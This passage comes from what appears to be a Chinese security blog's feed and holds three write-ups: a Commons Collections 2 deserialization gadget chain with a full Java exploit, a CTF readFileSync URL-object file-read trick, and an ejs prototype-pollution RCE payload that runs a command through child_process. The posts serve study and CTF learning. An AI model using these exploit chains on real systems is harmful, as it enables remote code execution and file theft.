   <span class="comment">// 第二部分：反射创建TemplatesImpl实例</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span>  constructor.newInstance();</span><br><span class="line">        setFieldValue(TemplatesImpl_instance,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);         <span class="comment">//给_bytecodes属性赋值</span></span><br><span class="line">        setFieldValue(TemplatesImpl_instance,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;sk1y&quot;</span>);       <span class="comment">// 给_name属性赋值</span></span><br></pre></td></tr></table></figure><h3 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h3><p>根据之前分析CC1的链子，在InvokerTransformer类中有一个transform方法会根据传入的iMethodName，iParamTypes，iArgs这三个成员属性来执行class对象的某个方法，且这三个参数可控，所以可以通过InvokerTransformer.transform去调用TemplatesImpl.newTransformer</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102101350551.png" alt="image-20221102101350551"></p><p>因为该newTransformer是无参方法，所以iMethodName和iParamTypes都是空的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>发现InvokerTransformer类中的transform方法是通过实现Transformer接口来的，因此下一步的思路就是查找哪些类调用了Transformer接口的transform方法并且还实现了Serializable接口</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102103742357.png" alt="image-20221102103742357"></p><p>对应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为是无参方法newTransformer，所以参数类型和参数值都不用设置</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>最后找到TransformingComparator类</p><h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare"></a>TransformingComparator.compare</h3><p>该方法调用了transformer属性的transform方法，并且decorated和transformer属性是<code>可控的</code>，可以通过反射进行赋值</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102114316462.png" alt="image-20221102114316462"></p><p>对应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>然后怎么调用TransformingComparator.compare(obj1,obj2)呢？其中obj1和obj2是恶意类字节码</p><h3 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject"></a>PriorityQueue.readObject</h3><p>PriorityQueue类内部的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject</span><br><span class="line">    --&gt;PriorityQueue.heapify</span><br><span class="line">    --&gt;PriorityQueue.siftDown</span><br><span class="line">    --&gt;PriorityQueue.siftDownUsingComparator</span><br><span class="line">    --&gt;PriorityQueue.comparator.compare()</span><br></pre></td></tr></table></figure><p>这里就要借助jdk中的PriorityQueue集合了，PriorityQueue是一个优先队列，每次排序都会触发comparator比较器的compare方法，并且PriorityQueue还重写了readObject方法</p><p>我们分析一下PriorityQueue的readObject方法</p><p>readObject方法将数据还原为java对象，存放于queue数组，接着调用heapify()</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102145543042.png" alt="image-20221102145543042"></p><p>跟进heapify，将queue作为参数调用siftDown()函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102145740389.png" alt="image-20221102145740389"></p><p>跟进siftDown，判断属性comparator是否存在，存在则调用siftDownUsingComparator方法，不存在则调用siftDownComparable方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102145818475.png" alt="image-20221102145818475"></p><p>其中siftDownUsingComparator方法经过一点判断之后，会调用comparator.compare方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102150118084.png" alt="image-20221102150118084"></p><p>而siftDownComparable方法会生成一个Comparable比较器并调用compareTo方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102150710222.png" alt="image-20221102150710222"></p><p>在siftDownUsingComparator方法中，我们可以通过反射控制属性comparator为TransformingComparator类对象，接着调用compare函数，那么就需要使用反射将<code>queue属性</code>赋值为<code>TemplatesImpl对象数组</code></p><p>对应的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">       <span class="comment">//让size增加</span></span><br><span class="line">       priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">       priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">       setFieldValue(priorityQueue,<span class="string">&quot;comparator&quot;</span>,transformingComparator);<span class="comment">//给comparator赋值</span></span><br><span class="line">       setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;);</span><br></pre></td></tr></table></figure><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>之前是逆向着去分析应该调用什么类，现在正向执行去看看调用中的一些细节</p><p>PriorityQueue类中最后调用TemplatesImpl.compare方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102203529215.png" alt="image-20221102203529215"></p><p>到comparea方法，调用transform方法，这里的obj1和obj2是一样的，我们都将其赋值为恶意类</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102203544637.png" alt="image-20221102203544637"></p><p>进入InvokerTransformer类的transform方法，发现反射调用TemplatesImpl类的newTransformer方法，没有参数，所以iArgs为null，可以发现我们代码中调用构造函数那里对应参数也是null</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102203633100.png" alt="image-20221102203633100"></p><p>跟进去看看TemplatesImpl类内部的调用，newTransformer方法中调用getTransletInstance</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102204858509.png" alt="image-20221102204858509"></p><p>跟进，会判断<code>_name</code>是否为空，这也是之前对<code>_name</code>赋值的原因，然后当<code>_class</code>为空的时候，调用defineTransletClasses对<code>_class</code>复制</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102204944177.png" alt="image-20221102204944177"></p><p>跟进，可以发现调用了defineClass对<code>_class</code>赋值</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102205222579.png" alt="image-20221102205222579"></p><p>然后对<code>_class</code>对应的类进行实例化，也就是我们恶意类，<code>实例化会将静态代码块中的代码实现</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102205616941.png" alt="image-20221102205616941"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一部分：使用ClassPool获取恶意类的字节码，恶意类中静态代码块就是我们可以执行的命令</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;Rome.calc1&quot;</span>);     <span class="comment">//弹计算器</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.getCtClass(&quot;cc2.Evil&quot;);      //不出网</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二部分：反射创建TemplatesImpl实例</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span>  constructor.newInstance();</span><br><span class="line">        setFieldValue(TemplatesImpl_instance,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);         <span class="comment">//给_bytecodes属性赋值</span></span><br><span class="line">        setFieldValue(TemplatesImpl_instance,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;sk1y&quot;</span>);       <span class="comment">// 给_name属性赋值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三部分：</span></span><br><span class="line">        <span class="comment">// 因为是无参方法newTransformer，所以参数类型和参数值都不用设置</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//PriorityQueue类对象构造</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//让size增加</span></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;comparator&quot;</span>,transformingComparator);</span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">// 上面两行和下面的意思差不多，就是将序列化和反序列化封装了一下</span></span><br><span class="line"><span class="comment">//        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(barr);</span></span><br><span class="line"><span class="comment">//        oos.writeObject(priorityQueue);</span></span><br><span class="line"><span class="comment">//        oos.close();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">//        Object object = ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义serialize方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义unserialize方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename )</span> <span class="keyword">throws</span>  IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>((Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221102202635937.png" alt="image-20221102202635937"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.cnblogs.com/nice0e3/p/13811335.html">Java安全之Javassist动态编程 - nice_0e3 - 博客园 (cnblogs.com)</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">Java安全之Commons Collections2分析 - nice_0e3 - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/qq_35733751/article/details/118890261">8-java安全——java反序列化CC2链分析_songly_的博客-CSDN博客</a></li><li><a href="https://www.cnblogs.com/byErichas/p/15749668.html">Java–cc2链反序列化漏洞&amp;超级清晰详细 - Erichas - 博客园 (cnblogs.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>readFileSync浅分析</title>
      <link href="/2022/11/01/readFileSync%E6%B5%85%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/01/readFileSync%E6%B5%85%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前言：在刚过去的祥云杯中，web类型题目有一个rustwaf的题目（corCTF 2022 simplewaf 改编而来），其中有个关于readFileSync的trick，这里分析一下</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>看下官方文档对readFileSync的解释，注意看，path可以是字符串，Buffer类对象，URL类对象等等</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101105307823.png" alt="image-20221101105307823"></p><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fs.readFileSync</span><br><span class="line">--&gt;fs.openSync(lib/fs.js)</span><br><span class="line">    --&gt; getValidatedPath(lib/internal/fs/utils.js) </span><br><span class="line">    --&gt;toPathIfFileURL(lib/internal/url.js)</span><br><span class="line">    --&gt;fileURLToPath(/lib/internal/url.js)</span><br><span class="line">    --&gt;getPathFromURLPosix(lib/internal/url.js)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/nodejs/node/blob/v18.x/lib/fs.js#L464">node&#x2F;fs.js at v18.x · nodejs&#x2F;node (github.com)</a></p><p>lib&#x2F;fs.js，查看readFileSync的源码，其调用了fs.openSync，并将path和options作为参数传入</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101112915789.png" alt="image-20221101112915789"></p><p>跟进fs.openSync（lib&#x2F;fs.js），其调用了getValidatedPath函数，将path作为参数传入</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101113136386.png" alt="image-20221101113136386"></p><p>跟进getValidatedPath(&#x2F;lib&#x2F;internal&#x2F;fs&#x2F;utils.js)，根据函数名，也就是获取路径的意思</p><p>这里调用了toPathIfFileURL，将path传入作为参数，字面意思（如果是URL实例，就转换为路径）<img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101114820054.png" alt="image-20221101114820054"></p><p>跟进toPathIfFileURL(lib&#x2F;internal&#x2F;url.js)，如果不是URL实例，就直接返回<code>fileURLOrPath</code>；如果是URL实例，就返回<code>fileURLToPath(fileURLOrPath);</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101114951320.png" alt="image-20221101114951320"></p><p>我们跟进<code>isURLInstance(/lib/internal/url.js)</code>看下是怎么判断是否为URL实例的</p><p>我们发现判断是否为URL实例的依据就是<code>是否含有href和origin属性</code>，所以我们添加这两个属性之后就可以伪造URL实例</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101145324153.png" alt="image-20221101145324153"></p><p>而判断URL实例成功后，则返回<code>fileURLToPath(fileURLOrPath)</code>，跟进(&#x2F;lib&#x2F;internal&#x2F;url.js)</p><p>发现需要path.protocol为<code>file:</code>，然后根据操作系统，调用对应的函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101151618908.png" alt="image-20221101151618908"></p><p>我们看下getPathFromURLPosix(url)</p><p>hostname属性需要为空，然后对pathname进行url解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101154255347.png" alt="image-20221101154255347"></p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>为什么一开始没有源码分析呢？</p><p>因为刚开始从readFileSync函数下断点，进不去函数里面，后来发现了一篇文章<a href="https://cloud.tencent.com/developer/article/2123023">corCtf2022一道有意思的node题 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>，配了下环境，就可以了，就是<code>把skipFiles中node_internals给注释掉</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101155151938.png" alt="image-20221101155151938"></p><p>前面的跳过，主要看最后的</p><p>for循环用于检验传入的URL实例中的属性 <code>pathname</code> 中是否包含 url编码后的 <code>/</code> ，若包含则抛出一个异常</p><p>在1410行，将传入的URL实例中 <code>pathname</code> 中的值进行url解码并返回</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101155717217.png" alt="image-20221101155717217"></p><p>这也就是最终fs.openSync函数中最终获取的path</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101160131202.png" alt="image-20221101160131202"></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>所以最后该json实例需要满足如下条件：</p><blockquote><ol><li>.href exists</li><li>.origin exists</li><li>.protocol &#x3D;&#x3D;&#x3D; ‘file:’</li><li>.hostname &#x3D;&#x3D;&#x3D; ‘’</li><li>.pathname is <code>/app/flag.txt</code> 这里我们知道了传入之后，其会进行一次url解码</li></ol></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://nodejs.org/api/fs.html#fsreadfilesyncpath-options">File system | Node.js v19.0.0 Documentation (nodejs.org)</a></li><li><a href="https://brycec.me/posts/corctf_2022_challenges#simplewaf">corCTF 2022 Challenges (brycec.me)</a></li><li><a href="https://cloud.tencent.com/developer/article/2123023">corCtf2022一道有意思的node题 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> nodejs安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> readFileSync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染配合ejs模板引擎RCE分析</title>
      <link href="/2022/11/01/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%85%8D%E5%90%88ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ERCE%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/01/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%85%8D%E5%90%88ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8ERCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>首先注意，这个是在原型链污染的前提下，进行的RCE，并不是ejs本身存在原型链污染导致RCE</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ejs版本 &lt; 3.1.7</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>因为该RCE的前提条件是原型链污染，为了方便本地复现，这里使用 <code>lodash.merge</code> 方法中的原型链污染漏洞。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install lodash@<span class="number">4.17</span><span class="number">.4</span></span><br><span class="line">npm install ejs@<span class="number">3.1</span><span class="number">.6</span></span><br><span class="line">npm install express</span><br></pre></td></tr></table></figure><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//设置模板的位置与种类</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views engine&#x27;</span>,<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对原型进行污染</span></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line">lodash.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));</span><br><span class="line"></span><br><span class="line"><span class="comment">//进行渲染</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="property">render</span> (<span class="string">&quot;index.ejs&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;whoami test&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>index.ejs</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&lt;%= message%&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行 app.js 后访问 8000 